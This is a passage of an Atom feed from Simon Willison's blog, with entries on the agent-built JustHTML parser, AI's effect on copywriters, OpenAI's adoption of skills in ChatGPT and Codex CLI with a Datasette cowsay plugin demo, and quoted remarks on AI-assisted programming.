</summary><category term="definitions"/><category term="ai"/><category term="generative-ai"/><category term="slop"/><category term="ai-ethics"/></entry><entry><title>JustHTML is a fascinating example of vibe engineering in action</title><link href="https://simonwillison.net/2025/Dec/14/justhtml/#atom-everything" rel="alternate"/><published>2025-12-14T15:59:23+00:00</published><updated>2025-12-14T15:59:23+00:00</updated><id>https://simonwillison.net/2025/Dec/14/justhtml/#atom-everything</id><summary type="html">
    &lt;p&gt;I recently came across &lt;a href="https://github.com/EmilStenstrom/justhtml"&gt;JustHTML&lt;/a&gt;, a new Python library for parsing HTML released by Emil Stenström. It's a very interesting piece of software, both as a useful library and as a case study in sophisticated AI-assisted programming.&lt;/p&gt;
&lt;h4 id="first-impressions-of-justhtml"&gt;First impressions of JustHTML&lt;/h4&gt;
&lt;p&gt;I didn't initially know that JustHTML had been written with AI assistance at all. The README caught my eye due to some attractive characteristics:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It's pure Python. I like libraries that are pure Python (no C extensions or similar) because it makes them easy to use in less conventional Python environments, including Pyodide.&lt;/li&gt;
&lt;li&gt;"Passes all 9,200+ tests in the official &lt;a href="https://github.com/html5lib/html5lib-tests"&gt;html5lib-tests&lt;/a&gt; suite (used by browser vendors)" - this instantly caught my attention! HTML5 is a big, complicated but meticulously written specification.&lt;/li&gt;
&lt;li&gt;100% test coverage. That's not something you see every day.&lt;/li&gt;
&lt;li&gt;CSS selector queries as a feature. I built a Python library for this &lt;a href="https://github.com/simonw/soupselect"&gt;many years ago&lt;/a&gt; and I'm always interested in seeing new implementations of that pattern.&lt;/li&gt;
&lt;li&gt;html5lib has been &lt;a href="https://github.com/mozilla/bleach/issues/698"&gt;inconsistently maintained&lt;/a&gt; over the last few years, leaving me interested in potential alternatives.&lt;/li&gt;
&lt;li&gt;It's only 3,000 lines of implementation code (and another ~11,000 of tests.)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I was out and about without a laptop so I decided to put JustHTML through its paces on my phone. I &lt;a href="https://github.com/simonw/tools/pull/156#issue-3726212220"&gt;prompted Claude Code for web&lt;/a&gt; on my phone and had it build &lt;a href="https://tools.simonwillison.net/justhtml"&gt;this Pyodide-powered HTML tool&lt;/a&gt; for trying it out:&lt;/p&gt;
&lt;p style="text-align: center; margin-top: 1em"&gt;&lt;img src="https://static.simonwillison.net/static/2025/justhtml.jpeg" style="width:80%;" alt="Screenshot of a web app interface titled &amp;quot;Playground Mode&amp;quot; with buttons labeled &amp;quot;CSS Selector Query&amp;quot; (purple, selected), &amp;quot;Pretty Print HTML&amp;quot;, &amp;quot;Tree Structure&amp;quot;, &amp;quot;Stream Events&amp;quot;, &amp;quot;Extract Text&amp;quot;, and &amp;quot;To Markdown&amp;quot; (all gray). Below is a text field labeled &amp;quot;CSS Selector:&amp;quot; containing &amp;quot;p&amp;quot; and a green &amp;quot;Run Query&amp;quot; button. An &amp;quot;Output&amp;quot; section with dark background shows 3 matches in a green badge and displays HTML code" /&gt;&lt;/p&gt;
&lt;p&gt;This was enough for me to convince myself that the core functionality worked as advertised. It's a neat piece of code!&lt;/p&gt;
&lt;h4 id="turns-out-it-was-almost-all-built-by-llms"&gt;Turns out it was almost all built by LLMs&lt;/h4&gt;
&lt;p&gt;At this point I went looking for some more background information on the library and found Emil's blog entry about it: &lt;a href="https://friendlybit.com/python/writing-justhtml-with-coding-agents/"&gt;How I wrote JustHTML using coding agents&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Writing a full HTML5 parser is not a short one-shot problem. I have been working on this project for a couple of months on off-hours.&lt;/p&gt;
&lt;p&gt;Tooling: I used plain VS Code with Github Copilot in Agent mode. I enabled automatic approval of all commands, and then added a blacklist of commands that I always wanted to approve manually. I wrote an &lt;a href="https://github.com/EmilStenstrom/justhtml/blob/main/.github/copilot-instructions.md"&gt;agent instruction&lt;/a&gt; that told it to keep working, and don't stop to ask questions. Worked well!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Emil used several different models - an advantage of working in VS Code Agent mode rather than a provider-locked coding agent like Claude Code or Codex CLI. Claude Sonnet 3.7, Gemini 3 Pro and Claude Opus all get a mention.&lt;/p&gt;
&lt;h4 id="vibe-engineering-not-vibe-coding"&gt;Vibe engineering, not vibe coding&lt;/h4&gt;
&lt;p&gt;What's most interesting about Emil's 17 step account covering those several months of work is how much software engineering was involved, independent of typing out the actual code.&lt;/p&gt;
&lt;p&gt;I wrote about &lt;a href="https://simonwillison.net/2025/Oct/7/vibe-engineering/"&gt;vibe engineering&lt;/a&gt; a while ago as an alternative to vibe coding.&lt;/p&gt;
&lt;p&gt;Vibe coding is when you have an LLM knock out code without any semblance of code review - great for prototypes and toy projects, definitely not an approach to use for serious libraries or production code.&lt;/p&gt;
&lt;p&gt;I proposed "vibe engineering" as the grown up version of vibe coding, where expert programmers use coding agents in a professional and responsible way to produce high quality, reliable results.&lt;/p&gt;
&lt;p&gt;You should absolutely read &lt;a href="https://friendlybit.com/python/writing-justhtml-with-coding-agents/#the-journey"&gt;Emil's account&lt;/a&gt; in full. A few highlights:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;He hooked in the 9,200 test &lt;a href="https://github.com/html5lib/html5lib-tests"&gt;html5lib-tests&lt;/a&gt; conformance suite almost from the start. There's no better way to construct a new HTML5 parser than using the test suite that the browsers themselves use.&lt;/li&gt;
&lt;li&gt;He picked the core API design himself - a TagHandler base class with handle_start() etc. methods - and told the model to implement that.&lt;/li&gt;
&lt;li&gt;He added a comparative benchmark to track performance compared to existing libraries like html5lib, then experimented with a Rust optimization based on those initial numbers.&lt;/li&gt;
&lt;li&gt;He threw the original code away and started from scratch as a rough port of Servo's excellent &lt;a href="https://github.com/servo/html5ever"&gt;html5ever&lt;/a&gt; Rust library.&lt;/li&gt;
&lt;li&gt;He built a custom profiler and new benchmark and let Gemini 3 Pro loose on it, finally achieving micro-optimizations to beat the existing Pure Python libraries.&lt;/li&gt;
&lt;li&gt;He used coverage to identify and remove unnecessary code.&lt;/li&gt;
&lt;li&gt;He had his agent build a &lt;a href="https://github.com/EmilStenstrom/justhtml/blob/main/benchmarks/fuzz.py"&gt;custom fuzzer&lt;/a&gt; to generate vast numbers of invalid HTML documents and harden the parser against them.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This represents a lot of sophisticated development practices, tapping into Emil's deep experience as a software engineer. As described, this feels to me more like a lead architect role than a hands-on coder.&lt;/p&gt;
&lt;p&gt;It perfectly fits what I was thinking about when I described &lt;strong&gt;vibe engineering&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Setting the coding agent up with the html5lib-tests suite is also a great example of &lt;a href="https://simonwillison.net/2025/Sep/30/designing-agentic-loops/"&gt;designing an agentic loop&lt;/a&gt;.&lt;/p&gt;
&lt;h4 id="-the-agent-did-the-typing-"&gt;"The agent did the typing"&lt;/h4&gt;
&lt;p&gt;Emil concluded his article like this:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JustHTML is about 3,000 lines of Python with 8,500+ tests passing. I couldn't have written it this quickly without the agent.&lt;/p&gt;
&lt;p&gt;But "quickly" doesn't mean "without thinking." I spent a lot of time reviewing code, making design decisions, and steering the agent in the right direction. The agent did the typing; I did the thinking.&lt;/p&gt;
&lt;p&gt;That's probably the right division of labor.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I couldn't agree more. Coding agents replace the part of my job that involves typing the code into a computer. I find what's left to be a much more valuable use of my time.&lt;/p&gt;
    
        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/html"&gt;html&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vibe-coding"&gt;vibe-coding&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;&lt;/p&gt;
    

</summary><category term="html"/><category term="python"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="vibe-coding"/><category term="coding-agents"/></entry><entry><title>Copywriters reveal how AI has decimated their industry</title><link href="https://simonwillison.net/2025/Dec/14/copywriters-reveal-how-ai-has-decimated-their-industry/#atom-everything" rel="alternate"/><published>2025-12-14T05:06:19+00:00</published><updated>2025-12-14T05:06:19+00:00</updated><id>https://simonwillison.net/2025/Dec/14/copywriters-reveal-how-ai-has-decimated-their-industry/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://www.bloodinthemachine.com/p/i-was-forced-to-use-ai-until-the"&gt;Copywriters reveal how AI has decimated their industry&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
Brian Merchant has been collecting personal stories for his series &lt;a href="https://www.bloodinthemachine.com/s/ai-killed-my-job"&gt;AI Killed My Job&lt;/a&gt; - previously covering &lt;a href="https://www.bloodinthemachine.com/p/how-ai-is-killing-jobs-in-the-tech-f39"&gt;tech workers&lt;/a&gt;, &lt;a href="https://www.bloodinthemachine.com/p/ai-killed-my-job-translators"&gt;translators&lt;/a&gt;, and &lt;a href="https://www.bloodinthemachine.com/p/artists-are-losing-work-wages-and"&gt;artists&lt;/a&gt; - and this latest piece includes anecdotes from 12 professional copywriters all of whom have had their careers devastated by the rise of AI-generated copywriting tools.&lt;/p&gt;
&lt;p&gt;It's a tough read. Freelance copywriting does not look like a great place to be right now.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;AI is really dehumanizing, and I am still working through issues of self-worth as a result of this experience. When you go from knowing you are valuable and valued, with all the hope in the world of a full career and the ability to provide other people with jobs... To being relegated to someone who edits AI drafts of copy at a steep discount because “most of the work is already done” ...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The big question for me is if a new AI-infested economy creates new jobs that are a great fit for people affected by this. I would hope that clear written communication skills are made even more valuable, but the people interviewed here don't appear to be finding that to be the case.


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/copywriting"&gt;copywriting&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/careers"&gt;careers&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;&lt;/p&gt;



</summary><category term="copywriting"/><category term="careers"/><category term="ai"/><category term="ai-ethics"/></entry><entry><title>Quoting Obie Fernandez</title><link href="https://simonwillison.net/2025/Dec/13/obie-fernandez/#atom-everything" rel="alternate"/><published>2025-12-13T14:01:31+00:00</published><updated>2025-12-13T14:01:31+00:00</updated><id>https://simonwillison.net/2025/Dec/13/obie-fernandez/#atom-everything</id><summary type="html">
    &lt;blockquote cite="https://obie.medium.com/what-happens-when-the-coding-becomes-the-least-interesting-part-of-the-work-ab10c213c660"&gt;&lt;p&gt;If the part of programming you enjoy most is the physical act of writing code, then agents will feel beside the point. You’re already where you want to be, even just with some Copilot or Cursor-style intelligent code auto completion, which makes you faster while still leaving you fully in the driver’s seat about the code that gets written.&lt;/p&gt;
&lt;p&gt;But if the part you care about is the decision-making around the code, agents feel like they clear space. They take care of the mechanical expression and leave you with judgment, tradeoffs, and intent. Because truly, for someone at my experience level, that is my core value offering anyway. When I spend time actually typing code these days with my own fingers, it feels like a waste of my time.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://obie.medium.com/what-happens-when-the-coding-becomes-the-least-interesting-part-of-the-work-ab10c213c660"&gt;Obie Fernandez&lt;/a&gt;, What happens when the coding becomes the least interesting part of the work&lt;/p&gt;

    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/careers"&gt;careers&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;



</summary><category term="careers"/><category term="ai-assisted-programming"/><category term="generative-ai"/><category term="ai"/><category term="llms"/></entry><entry><title>Quoting OpenAI Codex CLI</title><link href="https://simonwillison.net/2025/Dec/13/openai-codex-cli/#atom-everything" rel="alternate"/><published>2025-12-13T03:47:43+00:00</published><updated>2025-12-13T03:47:43+00:00</updated><id>https://simonwillison.net/2025/Dec/13/openai-codex-cli/#atom-everything</id><summary type="html">
    &lt;blockquote cite="https://github.com/openai/codex/blob/ad7b9d63c326d5c92049abd16f9f5fb64a573a69/codex-rs/core/src/skills/render.rs#L20-L39"&gt;&lt;p&gt;How to use a skill (progressive disclosure):&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;After deciding to use a skill, open its &lt;code&gt;SKILL.md&lt;/code&gt;. Read only enough to follow the workflow.&lt;/li&gt;
&lt;li&gt;If &lt;code&gt;SKILL.md&lt;/code&gt; points to extra folders such as &lt;code&gt;references/&lt;/code&gt;, load only the specific files needed for the request; don't bulk-load everything.&lt;/li&gt;
&lt;li&gt;If &lt;code&gt;scripts/&lt;/code&gt; exist, prefer running or patching them instead of retyping large code blocks.&lt;/li&gt;
&lt;li&gt;If &lt;code&gt;assets/&lt;/code&gt; or templates exist, reuse them instead of recreating from scratch.&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;Description as trigger: The YAML &lt;code&gt;description&lt;/code&gt; in &lt;code&gt;SKILL.md&lt;/code&gt; is the primary trigger signal; rely on it to decide applicability. If unsure, ask a brief clarification before proceeding.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://github.com/openai/codex/blob/ad7b9d63c326d5c92049abd16f9f5fb64a573a69/codex-rs/core/src/skills/render.rs#L20-L39"&gt;OpenAI Codex CLI&lt;/a&gt;, core/src/skills/render.rs, &lt;a href="https://gist.github.com/simonw/25f2c3a9e350274bc2b76a79bc8ae8b2"&gt;full prompt&lt;/a&gt;&lt;/p&gt;

    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/skills"&gt;skills&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/openai"&gt;openai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/prompt-engineering"&gt;prompt-engineering&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/rust"&gt;rust&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;&lt;/p&gt;



</summary><category term="skills"/><category term="openai"/><category term="ai"/><category term="llms"/><category term="codex-cli"/><category term="prompt-engineering"/><category term="rust"/><category term="generative-ai"/></entry><entry><title>OpenAI are quietly adopting skills, now available in ChatGPT and Codex CLI</title><link href="https://simonwillison.net/2025/Dec/12/openai-skills/#atom-everything" rel="alternate"/><published>2025-12-12T23:29:51+00:00</published><updated>2025-12-12T23:29:51+00:00</updated><id>https://simonwillison.net/2025/Dec/12/openai-skills/#atom-everything</id><summary type="html">
    &lt;p&gt;One of the things that most excited me about &lt;a href="https://simonwillison.net/2025/Oct/16/claude-skills/"&gt;Anthropic's new Skills mechanism&lt;/a&gt; back in October is how easy it looked for other platforms to implement. A skill is just a folder with a Markdown file and some optional extra resources and scripts, so any LLM tool with the ability to navigate and read from a filesystem should be capable of using them. It turns out OpenAI are doing exactly that, with skills support quietly showing up in both their Codex CLI tool and now also in ChatGPT itself.&lt;/p&gt;
&lt;h4 id="skills-in-chatgpt"&gt;Skills in ChatGPT&lt;/h4&gt;
&lt;p&gt;I learned about this &lt;a href="https://x.com/elias_judin/status/1999491647563006171"&gt;from Elias Judin&lt;/a&gt; this morning. It turns out the Code Interpreter feature of ChatGPT now has a new &lt;code&gt;/home/oai/skills&lt;/code&gt; folder which you can access simply by prompting:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Create a zip file of /home/oai/skills&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I &lt;a href="https://chatgpt.com/share/693c9645-caa4-8006-9302-0a9226ea7599"&gt;tried that myself&lt;/a&gt; and got back &lt;a href="https://static.simonwillison.net/static/cors-allow/2025/skills.zip"&gt;this zip file&lt;/a&gt;. Here's &lt;a href="https://tools.simonwillison.net/zip-wheel-explorer?url=https%3A%2F%2Fstatic.simonwillison.net%2Fstatic%2Fcors-allow%2F2025%2Fskills.zip"&gt;a UI for exploring its content&lt;/a&gt; (&lt;a href="https://tools.simonwillison.net/colophon#zip-wheel-explorer.html"&gt;more about that tool&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/skills-explore.jpg" alt="Screenshot of file explorer. Files skills/docs/render_docsx.py and skills/docs/skill.md and skills/pdfs/ and skills/pdfs/skill.md - that last one is expanded and reads: # PDF reading, creation, and review guidance  ## Reading PDFs - Use pdftoppm -png $OUTDIR/$BASENAME.pdf $OUTDIR/$BASENAME to convert PDFs to PNGs. - Then open the PNGs and read the images. - pdfplumber is also installed and can be used to read PDFs. It can be used as a complementary tool to pdftoppm but not replacing it. - Only do python printing as a last resort because you will miss important details with text extraction (e.g. figures, tables, diagrams).  ## Primary tooling for creating PDFs - Generate PDFs programmatically with reportlab as the primary tool. In most cases, you should use reportlab to create PDFs. - If there are other packages you think are necessary for the task (eg. pypdf, pyMuPDF), you can use them but you may need topip install them first. - After each meaningful update—content additions, layout adjustments, or style changes—render the PDF to images to check layout fidelity:   - pdftoppm -png $INPUT_PDF $OUTPUT_PREFIX - Inspect every exported PNG before continuing work. If anything looks off, fix the source and re-run the render → inspect loop until the pages are clean.  ## Quality expectations - Maintain a polished, intentional visual design: consistent typography, spacing, margins, color palette, and clear section breaks across all pages. - Avoid major rendering issues—no clipped text, overlapping elements, black squares, broken tables, or unreadable glyphs. The rendered pages should look like a curated document, not raw template output. - Charts, tables, diagrams, and images must be sharp, well-aligned, and properly labeled in the PNGs. Legends and axes should be readable without excessive zoom. - Text must be readable at normal viewing size; avoid walls of filler text or dense, unstructured bullet lists. Use whitespace to separate ideas. - Never use the U+2011 non-breaking hyphen or other unicode dashes as they will not be" style="max-width: 100%;" /&gt;&lt;/p&gt;
&lt;p&gt;So far they cover spreadsheets, docx and PDFs. Interestingly their chosen approach for PDFs and documents is to convert them to rendered per-page PNGs and then pass those through their vision-enabled GPT models, presumably to maintain information from layout and graphics that would be lost if they just ran text extraction.&lt;/p&gt;
&lt;p&gt;Elias &lt;a href="https://github.com/eliasjudin/oai-skills"&gt;shared copies in a GitHub repo&lt;/a&gt;. They look very similar to Anthropic's implementation of the same kind of idea, currently published in their &lt;a href="https://github.com/anthropics/skills/tree/main/skills"&gt;anthropics/skills&lt;/a&gt; repository.&lt;/p&gt;
&lt;p&gt;I tried it out by prompting:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Create a PDF with a summary of the rimu tree situation right now and what it means for kakapo breeding season&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sure enough, GPT-5.2 Thinking started with:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Reading skill.md for PDF creation guidelines&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Searching rimu mast and Kākāpō 2025 breeding status&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It took &lt;a href="https://chatgpt.com/share/693ca54b-f770-8006-904b-9f31a585180a"&gt;just over eleven minutes&lt;/a&gt; to produce &lt;a href="https://static.simonwillison.net/static/cors-allow/2025/rimu_kakapo_breeding_brief.pdf"&gt;this PDF&lt;/a&gt;, which was long enough that I had Claude Code for web &lt;a href="https://github.com/simonw/tools/pull/155"&gt;build me a custom PDF viewing tool&lt;/a&gt; while I waited.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://tools.simonwillison.net/view-pdf?url=https%3A%2F%2Fstatic.simonwillison.net%2Fstatic%2Fcors-allow%2F2025%2Frimu_kakapo_breeding_brief.pdf"&gt;Here's ChatGPT's PDF in that tool&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/rimu.jpg" alt="Screenshot of my tool. There is a URL at the top, a Load PDF button and pagination controls. Then the PDF itself is shown, which reads: Rimu mast status and what it means for the kākāpō breeding season Summary as of 12 December 2025 (Pacific/Auckland context) Kākāpō breeding is tightly linked to rimu (Dacrydium cupressinum) mast events: when rimu trees set and ripen large amounts of fruit, female kākāpō are much more likely to nest, and more chicks can be successfully raised. Current monitoring indicates an unusually strong rimu fruiting signal heading into the 2025/26 season, which sets the stage for a potentially large breeding year in 2026.^1,2 Key numbers at a glance Kākāpō population (official DOC count) 237 birds alive Breeding trigger (rimu fruiting)&amp;gt;10% of rimu branch tips bearing fruit Forecast rimu fruiting for 2026 (DOC monitoring) Around 50–60% fruiting across breeding islands¹Breeding-age females (DOC 2025 planning figure)About 87 females (potentially nearly all could nest)" style="max-width: 100%;" /&gt;&lt;/p&gt;
&lt;p&gt;(I am &lt;strong&gt;very excited&lt;/strong&gt; about &lt;a href="https://www.auckland.ac.nz/en/news/2025/12/03/bumper-breeding-season-for-kakapo-on-the-cards.html"&gt;Kākāpō breeding season this year&lt;/a&gt;.)&lt;/p&gt;
&lt;p&gt;The reason it took so long is that it was fastidious about looking at and tweaking its own work. I appreciated that at one point it tried rendering the PDF and noticed that the macrons in kākāpō were not supported by the chosen font, so it switched to something else:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/skills-macrons.jpg" alt="ChatGPT screenshot. Analyzed image. There's an image of a page of PDF with obvious black blocks on some of the letters in the heading. It then says: Fixing font issues with macrons. The page is showing black squares for words like &amp;quot;kākāpō,&amp;quot; probably because Helvetica can't handle macrons. I'll switch to a font that supports them, such as DejaVu Sans or Noto Sans. I'll register both regular and bold fonts, then apply them to the document. I'll update the footer to note the issue with Helvetica. Time to rebuild the PDF!" style="max-width: 100%;" /&gt;&lt;/p&gt;
&lt;h4 id="skills-in-codex-cli"&gt;Skills in Codex CLI&lt;/h4&gt;
&lt;p&gt;Meanwhile, two weeks ago OpenAI's open source Codex CLI tool landed a PR titled &lt;a href="https://github.com/openai/codex/pull/7412"&gt;feat: experimental support for skills.md&lt;/a&gt;. The most recent docs for that are in &lt;a href="https://github.com/openai/codex/blob/main/docs/skills.md"&gt;docs/skills.md&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The documentation suggests that any folder in &lt;code&gt;~/.codex/skills&lt;/code&gt; will be treated as a skill.&lt;/p&gt;
&lt;p&gt;I dug around and found the code that generates the prompt that drives the skill system in &lt;a href="https://github.com/openai/codex/blob/ad7b9d63c326d5c92049abd16f9f5fb64a573a69/codex-rs/core/src/skills/render.rs#L20-L38"&gt;codex-rs/core/src/skills/render.rs&lt;/a&gt; - here's a Gist with &lt;a href="https://gist.github.com/simonw/25f2c3a9e350274bc2b76a79bc8ae8b2"&gt;a more readable version of that prompt&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I &lt;a href="https://claude.ai/share/0a9b369b-f868-4065-91d1-fd646c5db3f4"&gt;used Claude Opus 4.5's skill authoring skill&lt;/a&gt; to create &lt;a href="https://github.com/datasette/skill"&gt;this skill for creating Datasette plugins&lt;/a&gt;, then installed it into my Codex CLI skills folder like this:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;git clone https://github.com/datasette/skill \
  &lt;span class="pl-k"&gt;~&lt;/span&gt;/.codex/skills/datasette-plugin&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You have to run Codex with the &lt;code&gt;--enable skills&lt;/code&gt; option. I ran this:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c1"&gt;cd&lt;/span&gt; /tmp
mkdir datasette-cowsay
&lt;span class="pl-c1"&gt;cd&lt;/span&gt; datasette-cowsay
codex --enable skills -m gpt-5.2&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then prompted:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;list skills&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And Codex replied:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;- datasette-plugins — Writing Datasette plugins using Python + pluggy (file: /Users/simon/.codex/skills/datasette-plugin/SKILL.md)&lt;/code&gt;&lt;br /&gt;
&lt;code&gt;- Discovery — How to find/identify available skills (no SKILL.md path provided in the list)&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then I said:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Write a Datasette plugin in this folder adding a /-/cowsay?text=hello page that displays a pre with cowsay from PyPI saying that text&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It worked perfectly! Here's &lt;a href="https://github.com/simonw/datasette-cowsay"&gt;the plugin code it wrote&lt;/a&gt; and here's &lt;a href="http://gistpreview.github.io/?96ee928370b18eabc2e0fad9aaa46d4b"&gt;a copy of the full Codex CLI transcript&lt;/a&gt;, generated with my &lt;a href="https://simonwillison.net/2025/Oct/23/claude-code-for-web-video/"&gt;terminal-to-html tool&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You can try that out yourself if you have &lt;code&gt;uvx&lt;/code&gt; installed like this:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;uvx --with https://github.com/simonw/datasette-cowsay/archive/refs/heads/main.zip \
  datasette&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then visit:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://127.0.0.1:8001/-/cowsay?text=This+is+pretty+fun
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/cowsay-datasette.jpg" alt="Screenshot of that URL in Firefox, an ASCII art cow says This is pretty fun." style="max-width: 100%;" /&gt;&lt;/p&gt;
&lt;h4 id="skills-are-a-keeper"&gt;Skills are a keeper&lt;/h4&gt;
&lt;p&gt;When I first wrote about skills in October I said &lt;a href="https://simonwillison.net/2025/Oct/16/claude-skills/"&gt;Claude Skills are awesome, maybe a bigger deal than MCP&lt;/a&gt;. The fact that it's just turned December and OpenAI have already leaned into them in a big way reinforces to me that I called that one correctly.&lt;/p&gt;
&lt;p&gt;Skills are based on a &lt;em&gt;very&lt;/em&gt; light specification, if you could even call it that, but I still think it would be good for these to be formally documented somewhere. This could be a good initiative for the new &lt;a href="https://aaif.io/"&gt;Agentic AI Foundation&lt;/a&gt; (&lt;a href="https://simonwillison.net/2025/Dec/9/agentic-ai-foundation/"&gt;previously&lt;/a&gt;) to take on.&lt;/p&gt;
    
        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/pdf"&gt;pdf&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/kakapo"&gt;kakapo&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/openai"&gt;openai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/prompt-engineering"&gt;prompt-engineering&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/chatgpt"&gt;chatgpt&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/anthropic"&gt;anthropic&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/gpt-5"&gt;gpt-5&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/skills"&gt;skills&lt;/a&gt;&lt;/p&gt;
    

</summary><category term="pdf"/><category term="ai"/><category term="kakapo"/><category term="openai"/><category term="prompt-engineering"/><category term="generative-ai"/><category term="chatgpt"/><category term="llms"/><category term="ai-assisted-programming"/><category term="anthropic"/><category term="coding-agents"/><category term="gpt-5"/><category term="codex-cli"/><category term="skills"/></entry><entry><title>LLM 0.28</title><link href="https://simonwillison.net/2025/Dec/12/llm-028/#atom-everything" rel="alternate"/><published>2025-12-12T20:20:14+00:00</published><updated>2025-12-12T20:20:14+00:00</updated><id>https://simonwillison.net/2025/Dec/12/llm-028/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://llm.datasette.io/en/stable/changelog.html#v0-28"&gt;LLM 0.28&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
